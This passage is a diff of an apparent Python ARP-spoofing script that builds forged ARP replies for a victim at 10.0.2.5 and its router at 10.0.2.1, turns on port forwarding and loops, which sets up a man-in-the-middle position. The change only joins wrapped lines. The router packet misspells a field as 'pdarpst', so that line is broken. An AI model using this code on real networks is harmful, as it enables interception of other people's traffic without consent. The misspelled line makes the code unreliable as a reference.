@@ -137,11 +137,9 @@ if __name__ == "__main__":
     for i in range(0,len(ip)):
         print("%-18s       %s" % (ip[i],mac[i]))
 
-    victimpacket = ARP(op=2, pdst="10.0.2.5", hwdst="08:00:27:df:ef:2c",
-                     psrc="10.0.2.1", hwsrc="08:00:27:25:a4:94")
+    victimpacket = ARP(op=2, pdst="10.0.2.5", hwdst="08:00:27:df:ef:2c", psrc="10.0.2.1", hwsrc="08:00:27:25:a4:94")
 
-    routerpacket = ARP(op=2, pdarpst="10.0.2.1", hwdst="52:54:00:12:35:00",
-                 psrc="10.0.2.5", hwsrc="08:00:27:25:a4:94")
+    routerpacket = ARP(op=2, pdarpst="10.0.2.1", hwdst="52:54:00:12:35:00", psrc="10.0.2.5", hwsrc="08:00:27:25:a4:94")
 
     port_forwarding()
     while(1):
